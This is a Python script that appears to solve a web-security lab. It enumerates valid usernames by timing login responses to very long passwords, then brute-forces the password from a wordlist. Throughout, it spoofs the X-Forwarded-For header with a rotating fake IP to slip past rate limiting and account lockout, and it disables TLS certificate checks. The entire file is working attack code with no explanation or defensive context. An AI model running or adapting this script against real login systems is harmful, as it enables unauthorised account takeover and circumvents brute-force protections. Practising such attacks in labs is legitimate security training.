import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if(len(sys.argv) != 2): 
    print("Usage: different_response.py <url>")
    sys.exit(0)

url = sys.argv[1]
#word = sys.argv[2]

r = requests.get(url)

cookie_value = r.cookies['session']
#print(cookie_value)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
file1 = open('creds/usernames1','r')
names = file1.readlines()
username = ""
ip = 1
for name in names:
    test = False
    headers = {'session': cookie_value, 'X-Forwarded-For':'112.11.3.'+str(ip)}
    pay = {'username': name[:-1],'password': 't'*1000}
    try:
        #p = requests.post(url+'login', headers=headers, data = pay,proxies=proxies, verify=False, timeout=2) 
        p = requests.post(url+'login', headers=headers, data = pay,timeout=2) 
    except:
        test = True
    ip = ip + 1
    print("Tried "+ name[:-1], end="\r", flush=True)
    if test == False:
        continue
    else:
        print("\n Username : "+name[:-1])
        username = name[:-1]
        break

file2 = open('creds/passwords1','r')
passwords = file2.readlines()
password = ""

ip = 1
for passwd in passwords:
    headers = {'session' : cookie_value,'X-Forwarded-For': '203.42.126.'+str(ip)}
    #print(username)
    pay = {'username': username, 'password' : passwd[:-1]}

    print("Tried " + passwd[:-1], end="\r", flush=True)
    p = requests.post(url+'login', headers=headers, data=pay, proxies=proxies, verify=False)
    #print(p.status_code)
    ip = ip + 1
    if "Invalid username or password." in p.text or "You have made too many incorrect login attempts." in p.text:
        continue
    else:
        print("\n Password: "+passwd[:-1])
        password = passwd[:-1]
        break

